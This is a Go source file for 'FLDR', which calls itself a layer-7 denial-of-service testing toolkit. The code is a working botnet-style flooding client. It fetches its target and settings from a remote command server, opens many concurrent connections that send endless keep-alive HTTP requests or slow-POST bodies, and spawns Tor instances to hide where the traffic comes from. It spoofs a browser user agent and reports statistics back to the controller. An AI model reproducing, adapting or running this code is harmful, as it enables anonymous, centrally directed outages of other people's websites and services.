/*
	FLDR L7 denial-of-service testing toolkit
	Copyright (C) 2021 Matthew Coal

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU Affero General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU Affero General Public License for more details.

	You should have received a copy of the GNU Affero General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/
package main

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"golang.org/x/net/proxy"
)

// GLOBALS
type confbase struct {
	Enabled    bool
	DoTLS      bool
	DoSlowpost bool
	IP         string
	Hosts      []string
	ChosenHost string
	Port       int
	Path       string
	Method     string
	Header     string
	Conlen     int
}

var config = &confbase{false, false, false, "", []string{""}, "", 80, "/", "GET", "", 0}

// Report to postback
type Report struct {
	Act     int8
	Redials int
	Sent    int
	Status  string
	LastErr string
}

var postbackBase string

func splicr(errstr string) string {
	spl := strings.Split(errstr, ":")
	return strings.TrimSpace(spl[len(spl)-1])
}

func tryhup(ctrl <-chan bool, ack chan<- bool) bool {
	select {
	case <-ctrl:
		ack <- true // Send ACK
		return true
	default:
		break
	}
	return false
}

func dostuff(t proxy.Dialer, rep *Report, ctrl <-chan bool, ack chan<- bool) {
	ack <- true // Goroutine launched successfully
	var s net.Conn
	var err error
	for {
		if tryhup(ctrl, ack) {
			return
		}
		// Connection (re)establishment
		s, err = t.Dial("tcp", config.IP+":"+strconv.Itoa(config.Port))

		sockdead := false
		if err == nil {
			rep.Act++ // Increase active connections
			if config.DoTLS {
				s = tls.Client(s, &tls.Config{InsecureSkipVerify: true, ServerName: config.ChosenHost})
			}
			for { // Send infinite requests on one connection
				s.SetWriteDeadline(time.Now().Add(time.Second * 5))
				written, err := s.Write([]byte(config.Header))
				if err != nil { // Writing header failed!
					rep.LastErr = "Unable to write header: " + splicr(err.Error())
					break
				}
				rep.Sent += written
				if tryhup(ctrl, ack) {
					return
				}

				for i := 0; i < config.Conlen; i++ { // This will get ignored if conlen == 0
					s.SetWriteDeadline(time.Now().Add(time.Second * 2))
					written, err = s.Write([]byte{byte('A' + rune(rand.Intn(26)))})
					if err != nil {
						rep.LastErr = "Unable to write POST contents: " + splicr(err.Error())
						sockdead = true
						break
					}
					rep.Sent += written
					if config.DoSlowpost {
						time.Sleep(time.Second)
					}
					if tryhup(ctrl, ack) {
						return
					}
				}
				if sockdead {
					break
				}
			}
			rep.Act--
		} else {
			rep.LastErr = "Failed to establish connection: " + splicr(err.Error())
		}
		if s != nil {
			s.Close()
		}
		time.Sleep(time.Millisecond * 100)
		rep.Redials++
	}
}

func torKeepAliver(orport string) {
	t := exec.Command("tor", "SocksPort", orport, "DataDirectory", "./tordir-"+orport, "--hush")
	t.Stdout = os.Stdout
	err := t.Start()
	if err != nil {
		panic(err)
	}
	t.Wait()
	torKeepAliver(orport)
}

func supervisor(id int, useTor bool, childCount int, report *Report) {
	var threadsoff = true
	var dlr proxy.Dialer
	var err error
	report.Status = "standby"
	ctrl := make(chan bool, childCount)
	ack := make(chan bool, childCount)
	for {
		if threadsoff && config.Enabled { // Boot process
			fmt.Println("supervisor: booting, tor =", useTor)
			if useTor {
				report.Status = "tor initialization..."
				orport := fmt.Sprint(9050 + id)
				go torKeepAliver(orport)
				dlr, err = proxy.SOCKS5("tcp", "127.0.0.1:"+orport, nil, &net.Dialer{Timeout: time.Second * 3})
				if err != nil {
					panic(err)
				}
			} else {
				dlr = &net.Dialer{Timeout: time.Second * 3}
			}

			// Forking children
			for i := 0; i < childCount; i++ {
				report.Status = fmt.Sprintf("forking workers... (%d/%d acks)", i, childCount)
				go dostuff(dlr, report, ctrl, ack)
				<-ack
			}
			fmt.Println("supervisor: worker boot complete")
			report.Status = "active"
			threadsoff = false
		}

		if !threadsoff && !config.Enabled {
			threadsoff = true
			for i := 0; i < childCount; i++ {
				report.Status = fmt.Sprintf("suspending... (%d/%d acks)", i, childCount)
				ctrl <- true
				<-ack
			}
			report.Status = "standby"
		}

		time.Sleep(time.Second * 3)
	}
}

func composeHeader() {
	if config.Method == "POST" {
		config.Conlen = rand.Intn(2000)
	} else {
		config.Conlen = 0
	}
	config.ChosenHost = config.Hosts[rand.Intn(len(config.Hosts))]
	config.Method = strings.ToUpper(config.Method)
	config.Header = config.Method + " " + config.Path + " HTTP/1.1\r\n"
	config.Header += "Host: " + config.ChosenHost + "\r\n"
	config.Header += "Connection: keep-alive\r\n"
	config.Header += "Pragma: no-cache\r\n"
	config.Header += "Cache-Control: no-cache\r\n"
	config.Header += "Origin: http://" + config.ChosenHost + "/\r\n"
	config.Header += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36\r\n"
	config.Header += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
	if config.Conlen > 0 {
		config.Header += "Content-Length: " + strconv.Itoa(config.Conlen) + "\r\n"
		config.Header += "Content-Type: application/x-www-form-urlencoded\r\n"
	}
	config.Header += "\r\n"
}

func main() {
	if len(os.Args) < 3 {
		panic("usage: ./script [threads] [supervisor count]")
	}

	// Validating inputs
	threads, err := strconv.Atoi(os.Args[1])
	if err != nil {
		fmt.Println("please use integer as thread count!")
		return
	}
	supcount, err := strconv.Atoi(os.Args[2])
	if err != nil {
		fmt.Println("please use integer as supervisor count!")
		return
	}

	var backreports []*Report

	fmt.Println("init: retrieving initial configuration...")
	client := &http.Client{}
	req, err := http.NewRequest("GET", postbackBase+"config", nil)
	if err != nil {
		panic("error bootstrapping: cannot retrieve initial config")
	}
	resp, err := client.Do(req)
	if err != nil {
		panic("error bootstrapping: cannot retrieve initial config")
	}
	conf, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		panic("error bootstrapping: cannot retrieve initial config")
	}
	err = json.Unmarshal(conf, config)
	if err != nil {
		panic("error bootstrapping: cannot retrieve initial config")
	}
	defer resp.Body.Close()
	composeHeader()

	// Generate ID
	updateID, err := os.Hostname()
	if err != nil {
		panic("error bootstrapping: unable to retrieve hostname")
	}

	// Start goroutines
	fmt.Println("init: forking supervisors...")
	usetor := true
	if supcount == 0 {
		usetor = false
		supcount++
	}
	for i := 0; i < supcount; i++ {
		repptr := &Report{Act: 0, Redials: 0, Sent: 0, Status: ""}
		backreports = append(backreports, repptr)
		go supervisor(i, usetor, threads, repptr)
	}
	fmt.Println("init: FLDR version 0.0.23 initialization complete")

	for {
		jsn, err := json.Marshal(backreports)
		if err != nil {
			fmt.Println("http ee:", err)
		}
		req, err := http.NewRequest("POST", postbackBase+"update/"+updateID, bytes.NewReader(jsn))
		req.Header.Set("Content-Type", "application/json")
		if err != nil {
			fmt.Println("http ee:", err)
			continue
		}

		resp, err := client.Do(req)
		if err != nil {
			fmt.Println("http ee:", err)
			continue
		}
		conf, err := ioutil.ReadAll(resp.Body)
		defer resp.Body.Close()
		if err != nil {
			fmt.Println("http ee:", err)
			continue
		}
		err = json.Unmarshal(conf, config)
		if err != nil {
			fmt.Println("http ee:", err)
		}
		composeHeader()
		time.Sleep(time.Second * 2)
	}
}
